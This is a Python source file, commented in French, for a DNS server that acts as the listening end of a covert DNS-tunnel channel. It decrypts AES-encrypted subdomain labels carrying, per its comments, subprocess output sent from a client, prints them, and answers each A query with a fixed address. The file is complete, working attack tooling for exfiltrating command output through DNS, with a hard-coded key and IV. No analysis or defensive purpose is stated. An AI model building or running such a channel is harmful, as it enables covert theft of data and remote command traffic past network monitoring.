import time
from dnslib import DNSRecord, DNSHeader, QTYPE, A, RR
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# IP en réponse
IP_REPLY = '1.2.3.4'

# en écoute sur toutes les interfaces
# 0.0.0.0:53
HOST = '0.0.0.0'
PORT = 53
KEY = b'277EED8594C6C65M'
IV = b'A5E8E95AF2723449'

def encrypt_aes_cbc(key, iv, plaintext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(ciphertext).decode()

def decrypt_aes_cbc(key, iv, ciphertext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
    
    return unpad(decrypted_data, AES.block_size).decode()

class CustomResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = request.q.qtype

        # tableau vide pour stocker tous les fragments de retour
        # de subprocess
        decoded_data_list = []

        # on retire les 2 dernières données, qui représenter python.com
        for label in qname.label[:-2]:
            # à faire : déchiffrer en AES (CBC ou CTR)
            encoded_data = label.decode()
            try:
                # décodage puis stockage dans le tableau
                decoded_data = decrypt_aes_cbc(KEY, IV, encoded_data)
                decoded_data_list.append(decoded_data)
                #decoded_data = base64.b64decode(encoded_data).decode()
                #decoded_data_list.append(decoded_data)
            
            # on récupère les erreurs
            except Exception as e:
                print(f"Error decoding label: {e}")

        # ajout du header DNS dans la requête en réponse au client (?)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        # pour les requêtes A (traduction d'un nom de domaine en @IP)
        if qtype == QTYPE.A:
            # renvoie de l'adresse 1.2.3.4
            reply.add_answer(RR(qname, qtype, rdata=A(IP_REPLY)))

        # retour de la réponse et du tableau décodée
        return reply, decoded_data_list

class CustomDNSHandler(DNSHandler):
    def handle(self):
        # on récupère la donnée de la requête
        data = self.request[0].strip()
        # on récupère la socket UDP
        socket = self.request[1]
        request = DNSRecord.parse(data)
        reply, decoded_data_list = self.server.resolver.resolve(request, self)
        
        try:
            for command in decoded_data_list:
                # on retire le retour à la ligne car la console
                # l'applique déjà
                print(command, end="")
        except Exception as e:
            print(e)

        socket.sendto(reply.pack(), self.client_address)

if __name__ == "__main__":
    resolver = CustomResolver()
    server = DNSServer(resolver, port=PORT, handler=CustomDNSHandler)

    server.start()
